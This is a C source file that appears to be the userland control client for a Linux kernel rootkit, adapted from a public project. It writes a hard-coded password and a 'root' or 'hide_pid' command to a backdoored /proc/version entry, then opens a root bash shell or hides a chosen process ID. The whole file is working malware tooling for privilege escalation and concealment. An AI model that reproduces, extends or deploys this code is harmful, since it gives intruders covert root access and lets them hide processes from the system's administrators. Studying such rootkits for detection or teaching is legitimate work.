/*
 * the idea of a simple interface to communicate with the rootkit came from
 * Maxim Biro <nurupo.contributions@gmail.com> @ https://github.com/nurupo/rootkit/
 * 
 * The sample code provided was modified to suit the needs of the project
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version >=2.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>

#define CFG_PROC_FILE "version"
#define CFG_PASS "password"
#define CFG_ROOT "root"
#define CFG_HIDE_PID "hide_pid"


void print_help(char **argv)
{
    printf(
        "Usage: %s [OPTION]...\n"
        "\n"
        "Options:\n"
        "  --root-shell            Grants you root shell access.\n"
        "  --hide-pid=PID          Hides the specified PID.\n"
        "                          Must be a filename without any path.\n"
        "  --help                  Print this help message.\n", argv[0]);
}

void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,char **pid)
{
    if (argc < 2) {
        fprintf(stderr, "Error: No arguments provided.\n\n");
        print_help(argv);
        exit(1);
    }

    opterr = 0;

    static struct option long_options[] = {
        {"root-shell",  no_argument,       0, 'a'},
        {"hide-pid",    required_argument, 0, 'b'},
        {"hide",        no_argument,       0, 'f'},
        {0,             0,                 0,  0 }
    };

    *root = 0;
    *hide_pid = 0;
    *pid = NULL;

    int opt;

    while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1) {

        switch (opt) {

            case 'a':
                *root = 1;
                fprintf(stderr, "root\n");
                break;

            case 'b':
                *hide_pid = 1;
                *pid = optarg;
                fprintf(stderr, "hide_pid\n");
                break;

            case 'h':
                print_help(argv);
                exit(0);

            case '?':
                fprintf(stderr, "Error: Unrecognized option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);

            case ':':
                fprintf(stderr, "Error: No argument provided for option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);
        }
    }

    if ((*root + *hide_pid ) != 1) {
        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
        print_help(argv);
        exit(1);
    }
}

void write_buffer(char **dest_ptr, char *src, size_t size)
{
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
}

int main(int argc, char **argv)
{
    int root;
    int hide_pid;
    char *pid;
    int unhide;
    int protect;
    int unprotect;

    handle_command_line_arguments(argc, argv, &root, &hide_pid, &pid);

    size_t buf_size = 0;

    buf_size += sizeof(CFG_PASS);

    if (root) {
        buf_size += sizeof(CFG_ROOT);
    } else if (hide_pid) {
        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
    }

    buf_size += 1; // for null terminator

    char *buf = malloc(buf_size);
    buf[buf_size - 1] = 0;

    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));

    if (root) {
        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
    } else if (hide_pid) {
        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    }

    int fd = open("/proc/" CFG_PROC_FILE, O_RDONLY);

    if (fd < 1) {
        int fd = open("/proc/" CFG_PROC_FILE, O_WRONLY);

        if (fd < 1) {
            fprintf(stderr, "Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
            return 1;
        }

        write(fd, buf, buf_size);
    } else {
        read(fd, buf, buf_size);
    }

    close(fd);
    free(buf);

    if (root) {
        execl("/bin/bash", "bash", NULL);
    }

    return 0;
}
